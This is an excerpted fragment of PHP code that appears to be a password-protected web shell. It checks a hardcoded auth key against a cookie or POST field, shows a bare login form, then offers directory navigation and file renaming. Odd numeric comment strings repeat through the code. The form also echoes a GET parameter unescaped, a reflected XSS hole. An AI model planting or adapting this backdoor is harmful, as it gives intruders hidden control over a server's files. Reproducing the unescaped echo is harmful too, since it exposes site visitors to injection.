...
$auth_key = "855afab1f39a34a3730c93e13e758f68";
...
$pass = false;
if (isset($_COOKIE['pw_name_76754'])) {
    if(($_COOKIE['pw_name_76754']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_76754'])) {
        if(($_POST['pw_name_76754']) == $auth_key) {
            setcookie("pw_name_76754", $_POST['pw_name_76754']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_76754' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1726329453931622 1726329453936964 1726329453769802 1726329453642835
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1726329453931622 1726329453936964 1726329453769802 1726329453642835
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1726329453931622 1726329453936964 1726329453769802 1726329453642835
            $name = PATH . "/" . $_GET['r'];
